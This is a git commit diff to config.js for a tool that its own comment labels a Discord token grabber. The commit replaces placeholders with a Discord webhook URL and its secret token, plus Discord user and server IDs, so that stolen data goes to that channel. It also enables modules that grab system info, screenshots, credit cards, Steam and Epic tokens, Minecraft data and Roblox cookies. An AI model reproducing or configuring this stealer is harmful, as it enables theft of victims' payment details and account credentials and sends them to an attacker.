3d0c83e415a666b83d0d76ad6fe8ca521c96ba74
ayopausearfffff <104231622+ayopausearfffff@users.noreply.github.com>
2023-03-11 22:26:10 -0600

    Update config.js

--- config.js
+++ config.js
@@ -1,9 +1,9 @@
 {
     // discord token grabber settings
 
-    "webhook": "WEBHOOK HERE",
-    "discord_id": "ENTER YOUR DISCORD ID",
-    "server_id": "ENTER YOUR SERVER ID",
+    "webhook": "https://discord.com/api/webhooks/1084244790952067072/AHAYDCqRYNBprKqBUFq96U1V4HgLLqHFbivu0czISv3F99X8q2KrcpV4s6-dD6UHtCJd",
+    "discord_id": "904415210729799760",
+    "server_id": "1084238428301951026",
 
    // you can change this if you have your own!
 
@@ -11,11 +11,11 @@
 
  // set to "true" and "false" only!
 
-    "grab_system": "false", 
-    "grab_screenhot": "false",
-    "grab_creditcard": "false",
-    "grab_steamtoken": "false",
-    "grab_epictoken": "false",
-    "grab_minecraft": "false",
-    "grab_robloxcookie": "false",
+    "grab_system": "True", 
+    "grab_screenhot": "True",
+    "grab_creditcard": "True",
+    "grab_steamtoken": "Truee",
+    "grab_epictoken": "True",
+    "grab_minecraft": "True",
+    "grab_robloxcookie": "True",
 }
